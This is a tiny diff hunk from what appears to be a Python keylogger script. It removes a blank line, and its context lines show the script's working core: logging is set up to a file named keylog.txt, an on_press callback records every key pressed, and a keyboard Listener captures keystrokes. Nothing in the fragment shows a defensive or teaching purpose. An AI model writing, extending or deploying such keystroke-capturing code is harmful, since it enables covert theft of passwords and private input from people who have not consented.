@@ -4,5 +4,4 @@ logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctim
 def on_press(key):
     logging.info(str(key))
 with Listener(on_press=on_press) as listener:
-
     listener.join()
